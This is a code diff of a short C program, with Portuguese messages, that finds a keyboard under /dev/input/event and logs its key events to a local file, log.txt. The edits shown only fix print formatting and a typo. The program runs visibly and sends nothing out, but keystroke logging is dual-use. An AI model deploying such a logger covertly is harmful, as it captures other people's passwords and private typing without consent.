@@ -14,7 +14,6 @@ char teclas[200] = {
     '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
 };
 
-
 int procurar_teclado(){
     printf("Procurando teclado..\n");
     printf("------------------------\n");
@@ -33,7 +32,7 @@ int procurar_teclado(){
                 if(strstr(nome, "keyboard") || strstr(nome, "Keyboard") ||
                    strstr(nome, "Key") || strstr(nome, "kbd") ||
                    strstr(nome, "AT") || strstr(nome, "Set")){
-                    printf("\n Encontrado, usando /dev/input/event%d", i, nome);
+                    printf("\n Encontrado, usando /dev/input/event%d (%s)\n", i, nome);
                       
                 return fd;
                 }
@@ -75,7 +74,7 @@ int main() {
         return 1;
     }
         
-    printf("teclado funcionando, aperta ctrl+c pra parar\n");
+    printf("\nteclado funcionando, aperta ctrl+c pra parar\n");
     
     FILE *log = fopen("log.txt", "a");
     if(log == NULL) {
@@ -89,7 +88,7 @@ int main() {
         int r = read(tec, &e, sizeof(e));
         
         if(r < 0) {
-            printf("Erroa ao ler /dev");
+            printf("Erro ao ler /dev");
             break;
         }
         
